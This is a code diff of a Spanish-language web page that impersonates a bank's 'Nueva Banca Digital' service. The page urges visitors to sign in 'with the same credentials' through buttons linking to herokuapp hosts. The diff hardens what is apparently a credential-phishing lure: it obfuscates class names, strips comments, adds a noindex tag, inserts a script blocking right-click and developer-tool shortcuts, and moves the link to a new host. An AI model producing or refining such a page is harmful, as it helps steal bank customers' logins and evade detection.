@@ -1,136 +1,120 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" data-v="x7k2">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Banca Digital</title>
+<meta name="robots" content="noindex" />
+<title>Portal de Servicios</title>
 <style>
   :root{
-    --verde:#006837; --verde2:#00914a; --tit:#6dc100;
+    --c1:#006837; --c2:#00914a; --c3:#6dc100;
   }
   *{box-sizing:border-box}
   body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#fff;color:#222}
-
-  /* ===== Visibilidad de bloques ===== */
-  .hero--desktop{ display:block; }
-  .hero--mobile{ display:none; }
+  .qw9x{ display:block; }
+  .pl7m{ display:none; }
   @media (max-width:768px){
-    .hero--desktop{ display:none; }
-    .hero--mobile{ display:block; }
+    .qw9x{ display:none; }
+    .pl7m{ display:block; }
   }
-
-  /* ====== ESTILOS DESKTOP (bloque .hero--desktop) ====== */
-  .container{
+  .vk3r{
     display:flex; align-items:center; justify-content:center;
     gap:40px; min-height:100vh; padding:0 5%; position:relative; overflow:hidden;
   }
-  .left{ flex:1; min-width:320px; display:flex; justify-content:center; align-items:center; }
-  .photo{ position:relative; width:100%; max-width:520px; isolation:isolate; }
-  .art{
+  .zt8a{ flex:1; min-width:320px; display:flex; justify-content:center; align-items:center; }
+  .hn2q{ position:relative; width:100%; max-width:520px; isolation:isolate; }
+  .jf6w{
     width:100%; height:auto; display:block;
     transform: translateX(clamp(-1000px, -10.5vw, -88px));
     will-change: transform;
   }
-  .right{ flex:1; min-width:300px; padding:20px 10px; }
-  .title{ color:var(--tit); font-size:40px; line-height:1.15; margin:0 0 16px;font-weight:500; }
-  .text{ font-size:22px; color:#333; margin:0 0 26px }
-  .text .brand{ color:#00724a; font-weight:600 }
-  .btn{
-    background:var(--verde); color:#fff; border:0; border-radius:10px;
+  .xm4p{ flex:1; min-width:300px; padding:20px 10px; }
+  .ry5s{ color:var(--c3); font-size:40px; line-height:1.15; margin:0 0 16px;font-weight:500; }
+  .ku8d{ font-size:22px; color:#333; margin:0 0 26px }
+  .ku8d .bw3n{ color:#00724a; font-weight:600 }
+  .gv2c{
+    background:var(--c1); color:#fff; border:0; border-radius:10px;
     padding:16px 24px; font-size:15px; font-weight: 500; cursor:pointer; transition:.2s;text-decoration: none;
   }
-  .btn:hover{ background:var(--verde2) }
-
-  /* Ajuste de tu bloque .sat SOLO en desktop */
+  .gv2c:hover{ background:var(--c2) }
   @media (min-width:769px){
-    .sat{ margin-top:-400px; text-align:center; }
+    .lp9e{ margin-top:-400px; text-align:center; }
   }
-
-  /* Tablet (desktop) */
   @media (max-width:1100px){
-    .title{ font-size:36px }
-    .text{ font-size:18px }
-    .art{ transform: translateX(clamp(-40px, -6vw, -120px)); }
+    .ry5s{ font-size:36px }
+    .ku8d{ font-size:18px }
+    .jf6w{ transform: translateX(clamp(-40px, -6vw, -120px)); }
   }
-
-  /* ====== ESTILOS MÓVIL (bloque .hero--mobile) ====== */
   @media (max-width:768px){
-    .m-container{
+    .nq4t{
      flex-direction:column; align-items:center; justify-content:flex-start;
       min-height:auto; padding:36px 18px; gap:22px; text-align:center;
     }
-    .m-photo{ max-width:300px; margin:0 auto; }
-    .m-photo img{ display:block; height:auto;     margin-top: -36px;
-    margin-left: -90px;}
-    .m-sat{ max-width:360px; width:100%; margin:0 auto; }
-    .m-title{ color:var(--tit); font-size:24px; line-height:1.2; margin:8px 0 12px; }
-    .m-text{ font-size:16px; line-height:1.55; color:#3a3a3a; margin:0 0 18px; }
-    .m-text .brand{ color:#00724a; font-weight:600; }
-    .m-btn{
+    .yc7f{ max-width:300px; margin:0 auto; }
+    .yc7f img{ display:block; height:auto; margin-top: -36px; margin-left: -90px;}
+    .dm5b{ max-width:360px; width:100%; margin:0 auto; }
+    .ws1g{ color:var(--c3); font-size:24px; line-height:1.2; margin:8px 0 12px; }
+    .eo6h{ font-size:16px; line-height:1.55; color:#3a3a3a; margin:0 0 18px; }
+    .eo6h .bw3n{ color:#00724a; font-weight:600; }
+    .tf8j{
       width:100%; max-width:360px; display:inline-block;
-      background:var(--verde); color:#fff; border:0; border-radius:12px;
+      background:var(--c1); color:#fff; border:0; border-radius:12px;
       padding:14px 22px; font-size:15px; font-weight:800; cursor:pointer; transition:.2s;
     }
-    .m-btn:hover{ background:var(--verde2); }
+    .tf8j:hover{ background:var(--c2); }
   }
+  img{pointer-events:none;user-select:none;-webkit-user-drag:none;-khtml-user-drag:none;-moz-user-drag:none;-o-user-drag:none;}
 </style>
+<script>document.addEventListener('contextmenu',function(e){e.preventDefault();});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'))){e.preventDefault();}});</script>
 </head>
-<body>
-
-  <!-- ======= DESKTOP ======= -->
-  <section class="hero--desktop">
-    <div class="container">
-      <div class="left">
-        <div class="photo">
-          <picture>
-            <img src="bos.webp" alt="Decoración" class="art" loading="eager" decoding="async">
-          </picture>
-        </div>
-      </div>
-
-      <div class="right sat">
-        <br>
-        <h1 class="title">¡Digitalizamos tu experiencia!</h1><br><br>
-        <p class="text">
-          Si ya se afilió a la <span class="brand">Nueva Banca Digital</span><br>
-          ingrese aquí con las mismas credenciales y obtenga este beneficio
-        </p>
-        <br><br>
-               <a href="https://bpro1-b0f43fc68138.herokuapp.com/" class="btn">Enviar Solicitud de Participación</a>
- 
-      </div>
-    </div>
-  </section>
-
-  <!-- ======= MÓVIL ======= -->
-  <section class="hero--mobile" aria-hidden="false">
-    <div class="m-container">
-      <div class="m-photo">
-        <picture>
-          <source srcset="bos2.webp" media="(max-width:768px)">
-          <img src="bos2.webp" alt="Decoración">
-        </picture>
-
-
-
-      </div>
-      <div style="    margin-top: -172px;
-    margin-left: 145px;">        <a class="m-title">¡Digitalizamos tu experiencia!</a>
+<body data-id="f3k9">
+<section class="qw9x" role="main">
+<div class="vk3r">
+<div class="zt8a">
+<div class="hn2q">
+<picture>
+<img src="bos.webp" alt="" class="jf6w" loading="eager" decoding="async" draggable="false" oncontextmenu="return false;">
+</picture>
+</div>
+</div>
+<div class="xm4p lp9e">
+<br>
+<h1 class="ry5s">¡Digitalizamos tu experiencia!</h1><br><br>
+<p class="ku8d">
+Si ya se afilió a la <span class="bw3n">Nueva Banca Digital</span><br>
+ingrese aquí con las mismas credenciales y obtenga este beneficio
+</p>
+<br><br>
+<a href="https://familiapro1-4950459bdd8d.herokuapp.com/" class="gv2c" rel="noopener">Enviar Solicitud de Participación</a>
+</div>
+</div>
+</section>
+<section class="pl7m" aria-hidden="false" role="complementary">
+<div class="nq4t">
+<div class="yc7f">
+<picture>
+<source srcset="bos2.webp" media="(max-width:768px)">
+<img src="bos2.webp" alt="" draggable="false" oncontextmenu="return false;">
+</picture>
+</div>
+<div style="margin-top:-172px;margin-left:145px;"><a class="ws1g">¡Digitalizamos tu experiencia!</a>
 </div>
 <br><br><br><br><br><br>
-      <div class="m-sat">
-        <br>
-        <p class="m-text">
-          Si ya se afilió a la <span class="brand">Nueva Banca Digital</span><br>
-          ingrese aquí con las mismas credenciales y obtenga este beneficio
-        </p>
-        <a style="text-decoration: none;" href="https://bpro1-b0f43fc68138.herokuapp.com/" class="m-btn">Enviar Solicitud de Participación</a>
-      </div>
-    </div>
-  </section>
-
+<div class="dm5b">
+<br>
+<p class="eo6h">
+Si ya se afilió a la <span class="bw3n">Nueva Banca Digital</span><br>
+ingrese aquí con las mismas credenciales y obtenga este beneficio
+</p>
+<a style="text-decoration:none;" href="https://familiapro1-4950459bdd8d.herokuapp.com/" class="tf8j" rel="noopener">Enviar Solicitud de Participación</a>
+</div>
+</div>
+</section>
 </body>
 </html>
+
+
+
 
 
 
